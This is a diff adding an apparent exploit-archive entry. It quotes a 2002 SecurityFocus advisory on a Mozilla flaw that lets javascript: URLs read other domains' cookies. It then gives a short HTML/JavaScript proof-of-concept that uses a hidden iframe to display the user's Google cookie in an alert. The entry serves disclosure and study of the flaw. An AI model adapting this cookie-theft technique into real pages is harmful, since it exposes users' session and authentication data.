@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/5293/info
+
+
+Mozilla is an open source web browser available for a number of platforms, including Microsoft Windows and Linux. An issue has been reported in the Mozilla web browser which may allow script code to access cookie data associated with arbitrary domains.
+
+It has been reported possible to create a javascript: URL which appears to start with a valid domain. Malicious script code may specify an arbitrary domain, and will be able to access cookie data associated with that domain.
+
+Exploitation of this vulnerability may result in a remote attacker gaining access to sensitive cookie data, including authentication credentials.
+
+<pre>
+Title: Mozilla cookie stealing/spoofing
+Date: [2002-07-24]
+Impact: Steal/spoof arbitrary cookie _ _
+using javascript: URLs o' \,=./ `o
+Author: Andreas Sandblad, sandblad@acc.umu.se (o o)
+---=--=---=--=--=---=--=--=--=--=---=--=--=-----ooO--(_)--Ooo---
+This demo will display your google cookie (must exist).
+</pre>
+
+<body onload=init()>
+<iframe name=f height=0 width=0 style=visibility:hidden></iframe>
+<script>
+function init(){
+f.location = "javascript://www.google.com/\n"+
+"'<body onload=alert(document.cookie)>'";
+}
+</script>
